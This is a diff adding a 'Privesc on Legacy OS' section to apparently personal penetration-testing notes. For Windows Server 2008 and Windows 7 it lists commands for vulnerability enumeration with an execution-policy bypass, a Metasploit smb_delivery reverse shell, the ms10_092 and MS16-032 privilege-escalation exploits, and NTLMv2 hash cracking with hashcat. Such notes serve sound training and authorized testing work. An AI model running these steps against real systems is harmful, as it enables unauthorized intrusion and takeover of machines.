@@ -544,6 +544,46 @@ PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=dom
     - `sudo responder -wrf -v -I INTERFACE-USED` (your interface can be tun0 for instance it has to be one reachable by the target)
   - Finally we can crack the found hash with hashcat `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`
 
+## Privesc on Legacy OS
+
+### Windows Server 2008
+
+- `wmic qfe` will show missing KBs
+- We can use [Sherlock](https://github.com/rasta-mouse/Sherlock) to find the vulnerabilities the target might have.
+  - On powershell `Set-ExecutionPolicy bypass -Scope process`
+  - `Import-Module .\Sherlock.ps1`
+  - `Find-AllVulns`
+- Get a meterpreter shell
+  - `msfconsole`
+  - `search smb_delivery` you should see this one `0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery`
+  - `use 0`
+  - `show options` set srvhost and lhost to your attack machine
+  - set the target to DLL (`show targets` `set target 0`
+  - `exploit`
+  - Paste the comand shown on msf in the target
+  - Receive the shell
+- Find a local privesc exploit
+ - For example we can use CVE 2010-3338
+ - on metasploit `search 2010-3338` you should see `0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation`
+ - Migrate the process
+ - Backgound the session `background`
+ - `set session 1`
+ - set lhost to your attacking machine IP
+ - set lport to a free prot
+ - `exploit`
+ - You should get an elevated shell
+
+### Windows Desktop 7
+
+- Gather `systeminfo` and use [windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+  - `python2.7 windows-exploit-suggester.py --update` this will dl a database file in xls format that you can use
+  - `python2.7 windows-exploit-suggester.py --database 2022-04-30-mssb.xls --systeminfo systeminfo`
+- Example of MS16-032 with this [poc](https://www.exploit-db.com/exploits/39719)
+  - In Powershell `Set-ExecutionPolicy bypass -scope process`
+  - `Import-Module .\exploit.ps1`
+  - `Invoke-MS16-032`
+  - We will get an elevated shell
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
